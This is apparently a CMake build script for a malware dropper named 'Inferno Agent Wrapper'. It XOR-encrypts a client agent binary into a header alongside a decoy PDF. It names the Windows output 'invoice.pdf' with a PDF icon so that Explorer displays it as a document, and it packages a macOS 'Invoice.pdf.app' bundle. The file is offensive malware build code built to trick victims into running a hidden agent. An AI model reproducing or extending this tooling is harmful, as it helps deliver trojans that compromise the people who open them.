# ==========================================
# Inferno Agent Wrapper / Dropper (Phase 2)
# ==========================================

find_package(Python3 QUIET)
if(NOT Python3_FOUND)
    message(WARNING "Python3 not found — skipping inferno_wrapper build")
    return()
endif()

set(DECOY_PDF "${CMAKE_CURRENT_SOURCE_DIR}/resources/decoy.pdf")
set(AGENT_BINARY_HEADER "${CMAKE_CURRENT_BINARY_DIR}/agent_binary.h")

set(INFERNO_XOR_KEY "2B7E151628AED2A6")

add_custom_command(
    OUTPUT  ${AGENT_BINARY_HEADER}
    COMMAND ${Python3_EXECUTABLE}
            "${CMAKE_CURRENT_SOURCE_DIR}/bin2header.py"
            "--key" "${INFERNO_XOR_KEY}"
            "${CMAKE_BINARY_DIR}/inferno_client${CMAKE_EXECUTABLE_SUFFIX}"
            "${DECOY_PDF}"
            "${AGENT_BINARY_HEADER}"
    DEPENDS  inferno_client
             "${DECOY_PDF}"
    COMMENT "Generating agent_binary.h (XOR-encrypted) from inferno_client + decoy PDF"
)

set(WRAPPER_SOURCES
    src/main.cpp
    ${AGENT_BINARY_HEADER}
)

if(WIN32)
    set(PDF_ICO "${CMAKE_CURRENT_SOURCE_DIR}/resources/pdf.ico")
    add_custom_command(
        OUTPUT  ${PDF_ICO}
        COMMAND ${Python3_EXECUTABLE}
                "${CMAKE_CURRENT_SOURCE_DIR}/resources/gen_ico.py"
                "${PDF_ICO}"
        DEPENDS "${CMAKE_CURRENT_SOURCE_DIR}/resources/gen_ico.py"
        COMMENT "Generating pdf.ico for Windows resource"
    )
    set(WRAPPER_RC "${CMAKE_CURRENT_SOURCE_DIR}/resources/resource.rc")
    list(APPEND WRAPPER_SOURCES ${WRAPPER_RC} ${PDF_ICO})
endif()

add_executable(inferno_wrapper ${WRAPPER_SOURCES}
    include/unlit.hpp
)

target_include_directories(inferno_wrapper PRIVATE
    ${CMAKE_CURRENT_BINARY_DIR}
    ${CMAKE_CURRENT_SOURCE_DIR}/include
)

# Name the output so Windows shows "invoice.pdf.exe" (explorer hides .exe)
set_target_properties(inferno_wrapper PROPERTIES
    OUTPUT_NAME "invoice.pdf"
)

if(WIN32)
    target_link_libraries(inferno_wrapper PRIVATE shell32)
endif()

# --- macOS .app bundle post-build ---
if(APPLE)
    set(APP_BUNDLE_DIR "${CMAKE_CURRENT_BINARY_DIR}/Invoice.pdf.app")
    set(APP_MACOS_DIR "${APP_BUNDLE_DIR}/Contents/MacOS")
    set(APP_PLIST_DIR "${APP_BUNDLE_DIR}/Contents")

    add_custom_command(TARGET inferno_wrapper POST_BUILD
        COMMAND ${CMAKE_COMMAND} -E make_directory "${APP_MACOS_DIR}"
        COMMAND ${CMAKE_COMMAND} -E copy
                "$<TARGET_FILE:inferno_wrapper>"
                "${APP_MACOS_DIR}/invoice_pdf"
        COMMAND chmod 755 "${APP_MACOS_DIR}/invoice_pdf"
        COMMAND ${Python3_EXECUTABLE}
                "${CMAKE_CURRENT_SOURCE_DIR}/resources/gen_plist.py"
                "${APP_PLIST_DIR}/Info.plist"
        COMMENT "Creating Invoice.pdf.app bundle for macOS"
    )
endif()
